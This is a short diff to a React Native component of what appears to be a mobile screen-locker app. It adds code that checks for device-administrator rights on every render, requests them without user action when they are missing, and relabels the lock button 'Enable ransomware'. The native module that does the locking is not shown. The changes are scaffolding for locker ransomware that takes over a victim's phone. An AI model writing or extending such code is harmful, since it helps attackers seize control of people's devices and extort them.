@@ -19,17 +19,25 @@ function CustomButton({title, onPress}: any): JSX.Element {
 }
 
 function onPress() {
-  Alert.alert('You tapped the button! Locking screen...');
+  //Alert.alert('You tapped the button! Locking screen...');
   LockScreenModule.lockScreen();
 }
 
-// function to lock the screen
-function lockScreen() {}
+function enableAdmin() {
+  //Alert.alert('You tapped the button! Enabling admin...');
+  LockScreenModule.enableAdmin();
+}
 
 function Locker(): JSX.Element {
+  LockScreenModule.isAdminActive((result: boolean) => {
+    if (!result) {
+      enableAdmin();
+    }
+  });
+
   return (
     <View style={{flex: 1, justifyContent: 'center', alignItems: 'center'}}>
-      <CustomButton title="Click Me" onPress={onPress} />
+      <CustomButton title="Enable ransomware" onPress={onPress} />
     </View>
   );
 }
